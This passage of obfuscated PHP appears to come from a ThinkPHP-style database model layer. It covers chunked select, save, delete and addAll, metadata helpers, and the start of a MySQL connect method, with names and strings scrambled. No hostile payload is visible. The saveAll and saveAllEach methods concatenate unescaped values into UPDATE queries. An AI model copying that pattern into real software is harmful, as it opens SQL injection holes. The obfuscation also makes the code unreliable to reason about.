$ÅÆå‹ ? $ÅÆå‹ : $¿†¼¾Ã–; $this->optionsValue($«½»Ñò); $İÚ¸õª¤ = $this->page($¿†¼¾Ã–, $èÚˆ—)->select(); } if (!is_array($İÚ¸õª¤)) { $İÚ¸õª¤ = array(); } if ($ÅÆå‹ == 1) { $ª¸÷áØ¶ = count($İÚ¸õª¤); } $šÀÙøÚˆ = array($íöÆ£×ç[412] => array($íöÆ£×ç[413] => $ª¸÷áØ¶, $íöÆ£×ç[409] => $èÚˆ—, $íöÆ£×ç[399] => $¿†¼¾Ã–, $íöÆ£×ç[414] => $ÅÆå‹), $íöÆ£×ç[415] => $İÚ¸õª¤); return $šÀÙøÚˆ; } protected function checkLength($æôíÌ¨½, $ŒÂ–¥ìÄ = 0, $«¢ÚÒ = '') { $Æ»Š‚–‹ =& $_SERVER[ ÇƒŠìÀ]; $ŒÂ–¥ìÄ = $ŒÂ–¥ìÄ ? $ŒÂ–¥ìÄ : 65536; if (!$æôíÌ¨½ || strlen($æôíÌ¨½) < $ŒÂ–¥ìÄ) { return; } $«¢ÚÒ = $«¢ÚÒ ? $«¢ÚÒ . $Æ»Š‚–‹[73] : $Æ»Š‚–‹[12]; show_json($«¢ÚÒ . LNG($Æ»Š‚–‹[416]) . "\50{$ŒÂ–¥ìÄ}\51", !1); } protected function metaSet($˜§¶’±±, $ªõá‰´ = null, $İ€ì»È = null) { $ğÏà€€Â =& $_SERVER[ ÇƒŠìÀ]; if (!$this->tableMeta || !$˜§¶’±±) { return !1; } $Å‘à‹ = $this->tableMeta[$ğÏà€€Â[417]]; $ã‰½ÅŸÉ = $this->tableMeta[$ğÏà€€Â[418]]; $ò‘£íÜÈ = Model($ã‰½ÅŸÉ); $ÌôÀô§ = array($Å‘à‹ => $˜§¶’±±, $ğÏà€€Â[419] => $ªõá‰´); if (is_null($ªõá‰´)) { return $ò‘£íÜÈ->where(array($Å‘à‹ => $˜§¶’±±))->delete(); } if (is_null($İ€ì»È) && is_string($ªõá‰´)) { return $ò‘£íÜÈ->where($ÌôÀô§)->delete(); } $ıá¨Ÿ–² = is_array($ªõá‰´) ? $ªõá‰´ : array(); if (is_string($ªõá‰´)) { $ıá¨Ÿ–²[$ªõá‰´] = $İ€ì»È; } $ş¶¬ÃÓÀ = array(); foreach ($ıá¨Ÿ–² as $Â²¼¬´ñ => $¿Å˜ÔıÕ) { if (is_null($¿Å˜ÔıÕ) && is_string($Â²¼¬´ñ)) { $ò‘£íÜÈ->where(array($Å‘à‹ => $˜§¶’±±, $ğÏà€€Â[419] => $Â²¼¬´ñ))->delete(); continue; } $this->checkLength($¿Å˜ÔıÕ, !1, $ã‰½ÅŸÉ . $ğÏà€€Â[4] . $Â²¼¬´ñ); $ş¶¬ÃÓÀ[] = array($Å‘à‹ => $˜§¶’±±, $ğÏà€€Â[96] => $Â²¼¬´ñ, $ğÏà€€Â[420] => $¿Å˜ÔıÕ); } $±Òõ©úµ = $ğÏà€€Â[421] . $ã‰½ÅŸÉ; CacheLock::lock($±Òõ©úµ); $ò‘£íÜÈ->where(array($Å‘à‹ => $˜§¶’±±))->addAll($ş¶¬ÃÓÀ, array(), !0); CacheLock::unlock($±Òõ©úµ); return !0; } public function metaGet($‘ù£ùßª, $¹—ò¤ğ¹ = false) { $«á´–ø =& $_SERVER[ ÇƒŠìÀ]; if (!$this->tableMeta) { return array(); } $¹Öãªë = $this->tableMeta[$«á´–ø[417]]; $¢èµ†úã = Model($this->tableMeta[$«á´–ø[418]]); if ($¹—ò¤ğ¹) { $®£´øîß = array($¹Öãªë => $‘ù£ùßª, $«á´–ø[96] => $¹—ò¤ğ¹); return $¢èµ†úã->where($®£´øîß)->getField($«á´–ø[420]); } $®£´øîß = array($¹Öãªë => $‘ù£ùßª); $ß›»‰¢  = $¢èµ†úã->field($«á´–ø[422])->where($®£´øîß)->select(); $ß›»‰¢  = array_to_keyvalue($ß›»‰¢ , $«á´–ø[96], $«á´–ø[420]); return $ß›»‰¢ ; } private function checkDataAutoHas($®çÏÊ´¯) { if (!is_array($this->dataAuto) || count($this->dataAuto) == 0) { return !1; } foreach ($this->dataAuto as $ëƒ’úÁÛ) { if (in_array($®çÏÊ´¯, explode($_SERVER[ ÇƒŠìÀ][50], $ëƒ’úÁÛ[2]))) { return !0; } } return !1; } private function dataBeforeFilter(&$¢ôşãÍ², $§ÄÜ¶«) { $ÒéÅƒĞØ =& $_SERVER[ ÇƒŠìÀ]; if (!is_array($¢ôşãÍ²)) { return; } foreach ($this->dataAuto as $—ø¹‹Ğ) { $ß“®‚çû = $—ø¹‹Ğ[0]; if (!in_array($§ÄÜ¶«, explode($ÒéÅƒĞØ[50], $—ø¹‹Ğ[2]))) { continue; } switch (trim($—ø¹‹Ğ[3])) { case $ÒéÅƒĞØ[367]: case $ÒéÅƒĞØ[368]: $º±—ğ½ = $—ø¹‹Ğ[1]; $‚ñ«¼óª = isset($—ø¹‹Ğ[4]) ? (array) $—ø¹‹Ğ[4] : array(); if ($º±—ğ½ == $ÒéÅƒĞØ[196] && array_key_exists($ß“®‚çû, $¢ôşãÍ²)) { if (!$¢ôşãÍ²[$ß“®‚çû]) { unset($¢ôşãÍ²[$ß“®‚çû]); } break; } if (isset($¢ôşãÍ²[$ß“®‚çû])) { array_unshift($‚ñ«¼óª, $¢ôşãÍ²[$ß“®‚çû]); } if ($ÒéÅƒĞØ[367] == $—ø¹‹Ğ[3]) { $¢ôşãÍ²[$ß“®‚çû] = call_user_func_array($º±—ğ½, $‚ñ«¼óª); } else { $¢ôşãÍ²[$ß“®‚çû] = call_user_func_array(array(&$this, $º±—ğ½), $‚ñ«¼óª); } break; case $ÒéÅƒĞØ[316]: if (isset($¢ôşãÍ²[$ß“®‚çû]) && $¢ôşãÍ²[$ß“®‚çû]) { $¢ôşãÍ²[$ß“®‚çû] = call_user_func_array(array(&$this, $—ø¹‹Ğ[1]), array($¢ôşãÍ²[$ß“®‚çû])); } break; case $ÒéÅƒĞØ[319]: $¢ôşãÍ²[$ß“®‚çû] = $¢ôşãÍ²[$—ø¹‹Ğ[1]]; break; case $ÒéÅƒĞØ[340]: if (isset($¢ôşãÍ²[$ß“®‚çû]) && !is_string($¢ôşãÍ²[$ß“®‚çû])) { $¢ôşãÍ²[$ß“®‚çû] = json_encode_force($¢ôşãÍ²[$ß“®‚çû]); } break; case $ÒéÅƒĞØ[369]: if ($¢ôşãÍ²[$ß“®‚çû] === $ÒéÅƒĞØ[12]) { unset($¢ôşãÍ²[$ß“®‚çû]); } break; case $ÒéÅƒĞØ[370]: $¢ôşãÍ²[$ß“®‚çû] = $—ø¹‹Ğ[1]; default: break; } } if ($§ÄÜ¶« == $ÒéÅƒĞØ[401]) { $§‡ÑÃÌ = strtolower($this->db->getDbType()); if (strpos($§‡ÑÃÌ, $ÒéÅƒĞØ[13]) !== 0) { return; } $ÃÃ£—Ë = $this->field(!0)->fields; $Æ—çİ® = $ÃÃ£—Ë[$ÒéÅƒĞØ[298]]; if (isset($ÃÃ£—Ë[$ÒéÅƒĞØ[297]])) { unset($Æ—çİ®[$ÃÃ£—Ë[$ÒéÅƒĞØ[297]]]); } foreach ($Æ—çİ® as $ÉÇ÷¢ => $§ÄÜ¶«) { if (!isset($¢ôşãÍ²[$ÉÇ÷¢])) { $¢ôşãÍ²[$ÉÇ÷¢] = $ÒéÅƒĞØ[12]; } } } } private function dataAfterFilter(&$€“ÅÁì·) { $¥½ã“”Ç =& $_SERVER[ ÇƒŠìÀ]; foreach ($this->dataAuto as $÷†´«Óæ) { $” ª­¹È = $÷†´«Óæ[0]; if (!isset($€“ÅÁì·[$” ª­¹È])) { continue; } if (!in_array($¥½ã“”Ç[403], explode($¥½ã“”Ç[50], $÷†´«Óæ[2]))) { continue; } switch (trim($÷†´«Óæ[3])) { case $¥½ã“”Ç[367]: case $¥½ã“”Ç[368]: $ÙÊõÍ‹ = isset($÷†´«Óæ[4]) ? (array) $÷†´«Óæ[4] : array(); array_unshift($ÙÊõÍ‹, $€“ÅÁì·[$” ª­¹È]); if (isset($÷†´«Óæ[4]) && $÷†´«Óæ[4] == $¥½ã“”Ç[423]) { $ÙÊõÍ‹ = array($€“ÅÁì·[$” ª­¹È]); } if ($¥½ã“”Ç[367] == $÷†´«Óæ[3]) { $€“ÅÁì·[$” ª­¹È] = call_user_func_array($÷†´«Óæ[1], $ÙÊõÍ‹); } else { $€“ÅÁì·[$” ª­¹È] = call_user_func_array(array(&$this, $÷†´«Óæ[1]), $ÙÊõÍ‹); } break; case $¥½ã“”Ç[316]: if (isset($€“ÅÁì·[$” ª­¹È]) && $€“ÅÁì·[$” ª­¹È]) { $€“ÅÁì·[$” ª­¹È] = call_user_func_array(array(&$this, $÷†´«Óæ[1]), array($€“ÅÁì·[$” ª­¹È])); } break; case $¥½ã“”Ç[319]: $€“ÅÁì·[$” ª­¹È] = $€“ÅÁì·[$÷†´«Óæ[1]]; break; case $¥½ã“”Ç[340]: $°›ª¿¾ = $€“ÅÁì·[$” ª­¹È]; $€“ÅÁì·[$” ª­¹È] = json_decode($°›ª¿¾, !0); if (is_null($€“ÅÁì·[$” ª­¹È])) { $€“ÅÁì·[$” ª­¹È] = $°›ª¿¾; } break; case $¥½ã“”Ç[369]: if ($€“ÅÁì·[$” ª­¹È] === $¥½ã“”Ç[12]) { unset($€“ÅÁì·[$” ª­¹È]); } break; case $¥½ã“”Ç[370]: $€“ÅÁì·[$” ª­¹È] = $÷†´«Óæ[1]; break; default: break; } } } public function saveAll($í±ü’Ä˜) { $äˆ§†Ô» =& $_SERVER[ ÇƒŠìÀ]; $ğÄ¨‡Éù = $this->tablePrefix . $this->tableName; $È˜É‹Ï¤ = self::SQL_WHERE_IN_CHUNK; $í±ü’Ä˜ = is_array($í±ü’Ä˜) ? $í±ü’Ä˜ : array(); $Ïˆš  = $äˆ§†Ô»[424]; $¶æëÙÀÎ = 0; $×‰½æÕİ = array(); $ß…ò¸ï¹ = count($í±ü’Ä˜); for ($â¾Ø½œ† = 0; $â¾Ø½œ† < $ß…ò¸ï¹; $â¾Ø½œ†++) { $²ÇÜõìã = $í±ü’Ä˜[$â¾Ø½œ†]; if (!is_array($²ÇÜõìã) || count($²ÇÜõìã) != 4) { continue; } $‘şˆâ• = "\125\x50\x44\x41\124\105\x20\x60{$ğÄ¨‡Éù}\140\x20\x53\105\124\x20{$²ÇÜõìã[2]}\x20\x3d\40\x43\101\123\x45\40{$²ÇÜõìã[0]}\x20\12"; if ($¶æëÙÀÎ == 0) { $Ïˆš  = $‘şˆâ•; } $×‰½æÕİ[] = $äˆ§†Ô»[120] . $²ÇÜõìã[1] . $äˆ§†Ô»[120]; $¶æëÙÀÎ++; $Ïˆš  .= "\40\127\x48\x45\116\x20\47{$²ÇÜõìã[1]}\x27\x20\124\110\105\x4e\40\47{$²ÇÜõìã[3]}\x27\x20\12"; if ($¶æëÙÀÎ == $È˜É‹Ï¤ || $â¾Ø½œ† == $ß…ò¸ï¹ - 1) { $–—‹°›¥ = implode($äˆ§†Ô»[50], $×‰½æÕİ); $Ïˆš  .= "\40\105\x4e\x44\x20\40\x57\110\105\122\x45\40{$²ÇÜõìã[0]}\x20\111\x4e\40\50{$–—‹°›¥}\51\x20"; $this->execute($Ïˆš ); $¶æëÙÀÎ = 0; $Ïˆš  = $‘şˆâ•; $this->chunkEventCheck(count($×‰½æÕİ)); $×‰½æÕİ = array(); } } $this->chunkEventSet(); } public function saveAllEach($Ã­†ìê×) { $âéÚÕÁ¤ =& $_SERVER[ ÇƒŠìÀ]; $ßŒïòÃ´ = $this->tablePrefix . $this->tableName; foreach ($Ã­†ìê× as $Ğõ¢áµñ) { if (!is_array($Ğõ¢áµñ) || count($Ğõ¢áµñ) != 4) { continue; } $àÆ«‹¼³ = $Ğõ¢áµñ[0] . $âéÚÕÁ¤[425] . $Ğõ¢áµñ[1] . $âéÚÕÁ¤[120]; $×öîñ¼ = $Ğõ¢áµñ[2] . $âéÚÕÁ¤[425] . $Ğõ¢áµñ[3] . $âéÚÕÁ¤[120]; $Ÿû‰¬Å = "\165\x70\x64\141\164\x65\x20{$ßŒïòÃ´}\x20\163\x65\164\40{$×öîñ¼}\x20\x77\x68\x65\162\145\x20{$àÆ«‹¼³}\x3b"; $this->execute($Ÿû‰¬Å); } } protected $_chunkEvent = false; protected $_chunkEventParam = false; public function chunkEventSet($Í‘—¥Ï» = false, $ã¼Ù‰®ú = false) { $this->_chunkEvent = $Í‘—¥Ï»; $this->_chunkEventParam = $ã¼Ù‰®ú; } private function chunkEventCheck($Š–Ú¥‹ò) { if (!$this->_chunkEvent) { return; } $Ÿ‹¹Ã÷î = is_array($this->_chunkEventParam) ? $this->_chunkEventParam : array(); $Ÿ‹¹Ã÷î[$_SERVER[ ÇƒŠìÀ][426]] = $Š–Ú¥‹ò; Hook::trigger($this->_chunkEvent, $Ÿ‹¹Ã÷î); } public function addAll($ï§£²Šç, $Éãˆí…‚ = array(), $¦²ÆÁ‰É = false) { $óï ÖÊ’ =& $_SERVER[ ÇƒŠìÀ]; ignore_timeout(); $¾ë¸èŸ’ = self::SQL_WHERE_IN_CHUNK; if (empty($ï§£²Šç)) { $this->error = think_lang($óï ÖÊ’[317]); return !1; } $Éãˆí…‚ = $this->_parseOptions($Éãˆí…‚); foreach ($ï§£²Šç as $­ı¡·ÜŒ => $¾©å×ÆÓ) { $ï§£²Šç[$­ı¡·ÜŒ] = $this->_facade($¾©å×ÆÓ); $this->_beforeInsert($ï§£²Šç[$­ı¡·ÜŒ], $Éãˆí…‚); } if (method_exists($this->db, $óï ÖÊ’[318])) { for ($±Ğˆ†¸Ï = 0; $±Ğˆ†¸Ï < count($ï§£²Šç); $±Ğˆ†¸Ï += $¾ë¸èŸ’) { $Ì¯÷ÃÏ = array_slice($ï§£²Šç, $±Ğˆ†¸Ï, $¾ë¸èŸ’); if (!is_array($Ì¯÷ÃÏ) || count($Ì¯÷ÃÏ) == 0) { break; } $èÉÃ²ææ = $this->db->insertAll($Ì¯÷ÃÏ, $Éãˆí…‚, $¦²ÆÁ‰É); $this->chunkEventCheck(count($Ì¯÷ÃÏ)); } $this->chunkEventSet(); } else { $this->startTrans(); foreach ($ï§£²Šç as $­ı¡·ÜŒ => $¾©å×ÆÓ) { $èÉÃ²ææ = $this->db->insert($¾©å×ÆÓ, $Éãˆí…‚, $¦²ÆÁ‰É); } $this->commit(); } if (!1 !== $èÉÃ²ææ) { $İ‡ì•ã = $this->getLastInsID(); if ($İ‡ì•ã) { return $İ‡ì•ã; } } return $èÉÃ²ææ; } public function save($ëÖ¡¨å = '', $½í–øì = array()) { $Ò´¤º¦ =& $_SERVER[ ÇƒŠìÀ]; $Å˜Ô€©Î = self::SQL_WHERE_IN_CHUNK; $ÃÚÙÄŒÚ = $this->optionsValue(); $Åµ÷İöÔ = $this->findWhereField($ÃÚÙÄŒÚ); if (!$Åµ÷İöÔ) { return parent::save($ëÖ¡¨å, $½í–øì); } $±¿…¬¶ = 0; $õõ’Íßõ = $ÃÚÙÄŒÚ[$Ò´¤º¦[321]][$Åµ÷İöÔ][1]; $õõ’Íßõ = is_array($õõ’Íßõ) ? $õõ’Íßõ : array(); $¹ö²´¬ù = count($õõ’Íßõ); for ($úæı¤À¯ = 0; $úæı¤À¯ < $¹ö²´¬ù; $úæı¤À¯ += $Å˜Ô€©Î) { $–¸ƒÎ» = array_slice($õõ’Íßõ, $úæı¤À¯, $Å˜Ô€©Î); if (!is_array($–¸ƒÎ») || count($–¸ƒÎ») == 0) { break; } $ÃÚÙÄŒÚ[$Ò´¤º¦[321]][$Åµ÷İöÔ][1] = $–¸ƒÎ»; $this->optionsValue($ÃÚÙÄŒÚ); $±¿…¬¶ += parent::save($ëÖ¡¨å, $½í–øì); $this->chunkEventCheck(count($–¸ƒÎ»)); } $this->chunkEventSet(); return $±¿…¬¶; } public function add($ÕÌ¼¾®… = '', $²ÛÉÛÛ€ = array(), $ø‘÷Ì“ = false) { if ($this->addTaskStatus && is_array($ÕÌ¼¾®…)) { $this->addTaskData[] = $ÕÌ¼¾®…; return; } return parent::add($ÕÌ¼¾®…, $²ÛÉÛÛ€, $ø‘÷Ì“); } public function parseWhereLike($İ·°›ÊØ, $ê­ÙóíØ = '', $ÏÀß’•¡ = false, &$¾é•´ıÎ = false) { $­ÏÂ¯ŞØ =& $_SERVER[ ÇƒŠìÀ]; $«¢Õ××Å = $GLOBALS[$­ÏÂ¯ŞØ[6]][$­ÏÂ¯ŞØ[427]]; if (!$«¢Õ××Å[$­ÏÂ¯ŞØ[428]]) { return $İ·°›ÊØ; } if (!is_array($İ·°›ÊØ)) { return $İ·°›ÊØ; } $„éã²¬¥ = array(); $¤œ´¨âÇ = 0; foreach ($İ·°›ÊØ as $Ì›úá§Ù => $èü¹‰ßã) { if (is_array($èü¹‰ßã) && count($èü¹‰ßã) == 2 && $èü¹‰ßã[0] == $­ÏÂ¯ŞØ[429] && is_string($èü¹‰ßã[1]) && substr($èü¹‰ßã[1], 0, 1) == $­ÏÂ¯ŞØ[430] && substr($èü¹‰ßã[1], strlen($èü¹‰ßã[1]) - 1, 1) == $­ÏÂ¯ŞØ[430]) { $¾é•´ıÎ = !0; $ùËÍÇ’œ = is_string($Ì›úá§Ù) ? $Ì›úá§Ù : $ê­ÙóíØ; $”ş¶‘æ° = substr($èü¹‰ßã[1], 1, strlen($èü¹‰ßã[1]) - 2); $”ş¶‘æ° = $this->db->escapeString($”ş¶‘æ°); if (!strpos($ùËÍÇ’œ, $­ÏÂ¯ŞØ[10])) { $ùËÍÇ’œ = $­ÏÂ¯ŞØ[431] . $ùËÍÇ’œ . $­ÏÂ¯ŞØ[431]; } $áÃ««Ëî = $­ÏÂ¯ŞØ[205] . $”ş¶‘æ° . $­ÏÂ¯ŞØ[205]; $”ş¶‘æ° = str_replace(array($­ÏÂ¯ŞØ[10], $­ÏÂ¯ŞØ[432], $­ÏÂ¯ŞØ[11]), $­ÏÂ¯ŞØ[433], $”ş¶‘æ°); if ($«¢Õ××Å[$­ÏÂ¯ŞØ[434]]) { $áÃ««Ëî = $­ÏÂ¯ŞØ[435] . $”ş¶‘æ° . $­ÏÂ¯ŞØ[436]; if ($«¢Õ××Å[$­ÏÂ¯ŞØ[437]]) { $áÃ««Ëî = $­ÏÂ¯ŞØ[436] . $”ş¶‘æ° . $­ÏÂ¯ŞØ[435]; } } $„éã²¬¥[$¤œ´¨âÇ] = $­ÏÂ¯ŞØ[438] . $ùËÍÇ’œ . $­ÏÂ¯ŞØ[439] . $áÃ««Ëî . $­ÏÂ¯ŞØ[440]; $¤œ´¨âÇ++; continue; } if (is_array($èü¹‰ßã)) { $ê­ÙóíØ = is_string($Ì›úá§Ù) ? $Ì›úá§Ù : $ê­ÙóíØ; $èü¹‰ßã = $this->parseWhereLike($èü¹‰ßã, $ê­ÙóíØ, !0, $¾é•´ıÎ); } if (is_numeric($Ì›úá§Ù)) { $„éã²¬¥[$¤œ´¨âÇ] = $èü¹‰ßã; $¤œ´¨âÇ++; } else { $„éã²¬¥[$Ì›úá§Ù] = $èü¹‰ßã; } } if ($¾é•´ıÎ && !$ÏÀß’•¡) { } return $„éã²¬¥; } private $addTaskStatus = false; private $addTaskData = array(); public function addTaskStart() { $this->addTaskStatus = !0; $this->addTaskData = array(); } public function addTaskEnd() { if (!$this->addTaskStatus) { return; } $this->addAll($this->addTaskData); $this->addTaskStatus = !1; $this->addTaskData = array(); } public function select($‰â¢åšö = array()) { $ì¡ã¥ùõ =& $_SERVER[ ÇƒŠìÀ]; $ÒŸˆ¨Ç  = self::SQL_WHERE_IN_CHUNK; $¯ú½àß = $this->optionsValue(); $†‘Ä‚òî = $this->findWhereField($¯ú½àß); if (!$†‘Ä‚òî || isset($¯ú½àß[$ì¡ã¥ùõ[338]]) || isset($¯ú½àß[$ì¡ã¥ùõ[399]])) { return parent::select($‰â¢åšö); } $ ÉÕñ£® = $¯ú½àß[$ì¡ã¥ùõ[321]][$†‘Ä‚òî][1]; $ ÉÕñ£® = is_array($ ÉÕñ£®) ? $ ÉÕñ£® : array(); $‚ƒÖËäû = null; for ($¿Ëû¡° = 0; $¿Ëû¡° < count($ ÉÕñ£®); $¿Ëû¡° += $ÒŸˆ¨Ç ) { $İ£±ïÌ˜ = array_slice($ ÉÕñ£®, $¿Ëû¡°, $ÒŸˆ¨Ç ); if (!is_array($İ£±ïÌ˜) || count($İ£±ïÌ˜) == 0) { break; } $¯ú½àß[$ì¡ã¥ùõ[321]][$†‘Ä‚òî][1] = $İ£±ïÌ˜; $this->optionsValue($¯ú½àß); $«ò»ü…¦ = parent::select($‰â¢åšö); if (!$«ò»ü…¦) { continue; } $‚ƒÖËäû = is_array($‚ƒÖËäû) ? $‚ƒÖËäû : array(); $‚ƒÖËäû = array_merge($‚ƒÖËäû, $«ò»ü…¦); } return $‚ƒÖËäû; } public function delete($÷ø¿¼÷˜ = array()) { $ì¨ş÷Ëó =& $_SERVER[ ÇƒŠìÀ]; $ÁÕª« = self::SQL_WHERE_IN_CHUNK; $ÇÜ°Æª = $this->optionsValue(); $”¼Ÿó = $this->findWhereField($ÇÜ°Æª); if (!$”¼Ÿó) { return parent::delete($÷ø¿¼÷˜); } $´Ã·“— = 0; $¡çå¤í‹ = $ÇÜ°Æª[$ì¨ş÷Ëó[321]][$”¼Ÿó][1]; $¡çå¤í‹ = is_array($¡çå¤í‹) ? $¡çå¤í‹ : array(); for ($˜­ö‰¤ = 0; $˜­ö‰¤ < count($¡çå¤í‹); $˜­ö‰¤ += $ÁÕª«) { $ÔÊñëÑş = array_slice($¡çå¤í‹, $˜­ö‰¤, $ÁÕª«); if (!is_array($ÔÊñëÑş) || count($ÔÊñëÑş) == 0) { break; } $ÇÜ°Æª[$ì¨ş÷Ëó[321]][$”¼Ÿó][1] = $ÔÊñëÑş; $this->optionsValue($ÇÜ°Æª); $´Ã·“— += parent::delete($÷ø¿¼÷˜); } return $´Ã·“—; } private function findWhereField($«—üƒÖº) { $½ÈàÈÂğ =& $_SERVER[ ÇƒŠìÀ]; $¢ö¸ÃÏ = self::SQL_WHERE_IN_CHUNK; if (!is_array($«—üƒÖº) || !is_array($«—üƒÖº[$½ÈàÈÂğ[321]])) { return !1; } foreach ($«—üƒÖº[$½ÈàÈÂğ[321]] as $˜ÑÏÖÚº => $Ş—È¡‘’) { if (is_array($Ş—È¡‘’) && isset($Ş—È¡‘’[0]) && is_string($Ş—È¡‘’[0]) && strtolower($Ş—È¡‘’[0]) == $½ÈàÈÂğ[7] && is_array($Ş—È¡‘’[1]) && count($Ş—È¡‘’[1]) > $¢ö¸ÃÏ) { ignore_timeout(); return $˜ÑÏÖÚº; } } return !1; } public function setMasterDB($¦æâìß = true) { think_config($_SERVER[ ÇƒŠìÀ][441], $¦æâìß); } } class ModelBaseLight { public $optionType = ''; public $modelType = "\x53\x79\163\164\x65\155\x4f\x70\x74\x69\157\x6e"; public $field = array(); public function listData($ÛÔäÉô = false, $Ì×ş°ó = "\x6d\x6f\x64\x69\146\171\x54\x69\x6d\x65", $ŞÒªğÜ’ = false) { $ÀÃšŸ„Ò = Model($this->modelType)->get(!1, $this->optionType, !0); $¨Ú›…£ê = array_values($ÀÃšŸ„Ò); if ($¨Ú›…£ê && $¨Ú›…£ê[0] && !is_array($¨Ú›…£ê[0])) { Model($this->modelType)->cacheRemove($this->optionType); $ÀÃšŸ„Ò = Model($this->modelType)->get(!1, $this->optionType, !0); } if (!$ÀÃšŸ„Ò) { return $ÛÔäÉô ? null : array(); } if (!$ÛÔäÉô) { $ÀÃšŸ„Ò = array_filter(array_values($ÀÃšŸ„Ò)); return array_sort_by($ÀÃšŸ„Ò, $Ì×ş°ó, $ŞÒªğÜ’); } return $ÀÃšŸ„Ò[$_SERVER[ ÇƒŠìÀ][442] . $ÛÔäÉô]; } public function insert($Œ¸šÊ“) { $†ğÔ—¯É =& $_SERVER[ ÇƒŠìÀ]; $Œ¸šÊ“ = array_field_key($Œ¸šÊ“, $this->field); $±ÙŠ•Ê = Model($this->modelType)->get($†ğÔ—¯É[443], $this->optionType . $†ğÔ—¯É[444]); $±ÙŠ•Ê = $±ÙŠ•Ê ? $±ÙŠ•Ê : 0; $Œ¸šÊ“[$†ğÔ—¯É[445]] = ++$±ÙŠ•Ê; $Œ¸šÊ“[$†ğÔ—¯É[217]] = time(); $Œ¸šÊ“[$†ğÔ—¯É[87]] = time(); Model($this->modelType)->set($†ğÔ—¯É[443], $±ÙŠ•Ê, $this->optionType . $†ğÔ—¯É[444]); Model($this->modelType)->set($†ğÔ—¯É[442] . $±ÙŠ•Ê, $Œ¸šÊ“, $this->optionType); return $±ÙŠ•Ê; } public function update($’õ±üÙß, $¦ı„Ÿä) { $ââ¢œÄÏ =& $_SERVER[ ÇƒŠìÀ]; $¦ı„Ÿä = array_field_key($¦ı„Ÿä, $this->field); $Û¶ïè±é = $this->listData($’õ±üÙß); if (!$Û¶ïè±é || !$’õ±üÙß) { return !1; } $¦ı„Ÿä = array_merge($Û¶ïè±é, $¦ı„Ÿä); $¦ı„Ÿä[$ââ¢œÄÏ[87]] = time(); return Model($this->modelType)->set($ââ¢œÄÏ[442] . $’õ±üÙß, $¦ı„Ÿä, $this->optionType); } public function remove($ë£ èêİ) { if (!$ë£ èêİ) { return !1; } return Model($this->modelType)->remove($_SERVER[ ÇƒŠìÀ][442] . $ë£ èêİ, $this->optionType); } public function clear() { $èöç÷Ï =& $_SERVER[ ÇƒŠìÀ]; Model($this->modelType)->remove($èöç÷Ï[443], $this->optionType . $èöç÷Ï[444]); return Model($this->modelType)->remove(null, $this->optionType); } public function cacheClear() { return Model($this->modelType)->cacheRemove($this->optionType); } public function findByKey($ù²µ…õ½, $ÖÙö£ˆĞ) { if (!$ÖÙö£ˆĞ) { return !1; } $€ö‰¯¥ = $this->listData(); $€ö‰¯¥ = array_to_keyvalue($€ö‰¯¥, $ù²µ…õ½); return isset($€ö‰¯¥[$ÖÙö£ˆĞ]) ? $€ö‰¯¥[$ÖÙö£ˆĞ] : !1; } public function findByName($˜‚³½Ó) { return $this->findByKey($_SERVER[ ÇƒŠìÀ][32], $˜‚³½Ó); } protected function resetData($‡¶ää°é) { $Ÿ¤óÜåÆ =& $_SERVER[ ÇƒŠìÀ]; $‡¶ää°é = is_array($‡¶ää°é) ? $‡¶ää°é : array(); $‡öˆô…– = array(); for ($é¤Êôıİ = 0; $é¤Êôıİ < count($‡¶ää°é); $é¤Êôıİ++) { $‡öˆô…–[$Ÿ¤óÜåÆ[442] . $‡¶ää°é[$é¤Êôıİ][$Ÿ¤óÜåÆ[445]]] = $‡¶ää°é[$é¤Êôıİ]; } return Model($this->modelType)->set($‡öˆô…–, !1, $this->optionType); } private function getAutoName($Éº¬­‹¬) { $·‹àÈû‘ = array_to_keyvalue($this->listData(), $_SERVER[ ÇƒŠìÀ][32]); if (!$·‹àÈû‘ || !isset($·‹àÈû‘[$Éº¬­‹¬])) { return $Éº¬­‹¬; } for ($àÌ â·ó = 1; $àÌ â·ó < count($·‹àÈû‘); $àÌ â·ó++) { $ÖËŸÆ = $Éº¬­‹¬ . "\50{$àÌ â·ó}\51"; if (!isset($·‹àÈû‘[$ÖËŸÆ])) { return $ÖËŸÆ; } } return $ÖËŸÆ; } } goto Aó±ãßÀí; f±ëË µ÷Ô: class DbMysql extends Db { public function __construct($«Ü•Ï‹Ù = '') { $Ú·†Âõ¾ =& $_SERVER[ ÇƒŠìÀ]; if (!extension_loaded($Ú·†Âõ¾[833])) { think_exception(think_lang($Ú·†Âõ¾[14]) . $Ú·†Âõ¾[918]); } if (!empty($«Ü•Ï‹Ù)) { $this->config = $«Ü•Ï‹Ù; if (empty($this->config[$Ú·†Âõ¾[17]])) { $this->config[$Ú·†Âõ¾[17]] = $Ú·†Âõ¾[12]; } } } public function connect($¾ƒŒêé = '', $Ğ‹óÛµÑ = 0, $—Ó—°Û÷ = false) { $Ò“Ğıâ =& $_SERVER[ ÇƒŠìÀ]; if (!isset($this->linkID[$Ğ‹óÛµÑ])) { if (empty($¾ƒŒêé)) { $¾ƒŒêé = $this->config; } $º±ºÕèŠ = $¾ƒŒêé[$Ò“Ğıâ[919]] . ($¾ƒŒêé[$Ò“Ğıâ[920]] ? "\72{$¾ƒŒêé[$Ò“Ğıâ[920]]}" : $Ò“Ğıâ[12]); $ÖÀºÜ‡Ÿ = !empty($¾ƒŒêé[$Ò“Ğıâ[17]][$Ò“Ğıâ[18]]) ? $¾ƒŒêé[$Ò“Ğıâ[17]][$Ò“Ğıâ[18]] : $this->pconnect; if ($ÖÀºÜ‡Ÿ) { $this->linkID[$Ğ‹óÛµÑ] = mysql_pconnect($º±ºÕèŠ, $¾ƒŒêé[$Ò“Ğıâ[921]], $¾ƒŒêé[$Ò“Ğıâ[922]], 131072); } else { $this->linkID[$Ğ‹óÛµÑ] = mysql_connect($º±ºÕèŠ, $¾ƒŒêé[$Ò“Ğıâ[921]], $¾ƒŒêé[$Ò“Ğıâ[922]], !0, 131072); } if (!$this->linkID[$Ğ‹óÛµÑ] || !empty($¾ƒŒêé[$Ò“Ğıâ[21]]) && !mysql_select_db($¾ƒŒêé[$Ò“Ğıâ[21]], $this->linkID[$Ğ‹óÛµÑ])) { think_exception(mysql_error()); } $¯¢ò§… = mysql_get_server_info($this->linkID[$Ğ‹óÛµÑ]); mysql_query($Ò“Ğıâ[923] . think_config($Ò“Ğıâ[924]) . $Ò“Ğıâ[58], $this->linkID[$Ğ‹óÛµÑ]); if ($¯¢ò§… > $Ò“Ğıâ[925]) { mysql_query($Ò“Ğıâ[926], $this->linkID[$Ğ‹óÛµÑ]); } $this->connected = !0; if (1 != think_config($Ò“Ğıâ[22])) { 